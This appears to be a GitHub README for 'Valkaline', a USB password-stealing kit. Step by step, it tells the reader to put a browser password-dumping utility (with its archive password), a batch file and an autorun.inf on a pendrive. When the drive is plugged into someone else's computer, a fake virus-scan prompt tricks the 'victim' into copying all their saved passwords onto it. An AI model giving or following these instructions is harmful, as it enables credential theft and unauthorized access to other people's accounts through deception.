# Valkaline
VALKALINE ELITE PASSWORD EXTRACTER
(you can simply download the whole files from the VALKALINE folder in the rep. and place them in your usb too!! it works...)

Download the Web browser pass view Zip file given in rep and then insert your Pendrive to your computer and format it as NTFS (Quick Format)

In the next step, you need to create a New Folder in your PenDrive and name the folder as “usb” and then extract the Web browser pass view ZIP file (Password:wbpv28821@) into the usb folder.

Then Open a Notepad and then copy the script file named "usbdrivercode" i.e given in rep. and save the file as usbdriver.bat

Again open a Notepad and then copy the script file named "autorun.inf" i.e given in rep. and this time save the file as autorun.inf

Now move both the files Autorun.inf and USBdriver.bat to your Pendrive. The tricky thing is whenever you will insert the USB drive into someone’ computer. it will ask you to perform a virus scan. Once you selected the yes all the password saved on victim’s computer will be saved into your Pendrive.

Open the Pendrive and double click on usbdriver.bat to see all the passwords.
